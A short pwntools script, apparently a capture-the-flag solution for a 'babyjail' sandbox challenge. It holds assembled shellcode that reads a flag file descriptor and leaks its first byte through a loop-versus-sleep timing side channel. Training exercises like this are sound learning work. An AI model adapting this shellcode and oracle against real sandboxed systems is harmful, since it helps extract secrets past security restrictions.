from pwn import *

context.arch='amd64'

flag = ''

r = process(['/challenge/babyjail_level11','/flag'])
guess = 0x70  
p = asm(
f'''
    jmp main

    loop:
        nop
        jmp loop

    main :
        mov rcx, 0x1337100

        mov rax, 0
        mov rdi, 3
        mov rsi, rcx
        mov rdx, 100
        syscall

        mov rcx, 0x1337100
        xor rbx, rbx
        mov bl, byte ptr [rcx]
        mov dl, {guess}
        cmp dl, bl
        jl loop
        
        push 0
        push 1

        mov rax, 35
        mov rdi, rsp
        mov rsi, 0
        syscall
        

    

''')
r.send(p)
r.recvuntil(b'Executing shellcode!\n\n')
try:
    r.recv(timeout=0.5)
    print(f'less than guess')

except:
    print(f'exit the program\n')

r.close()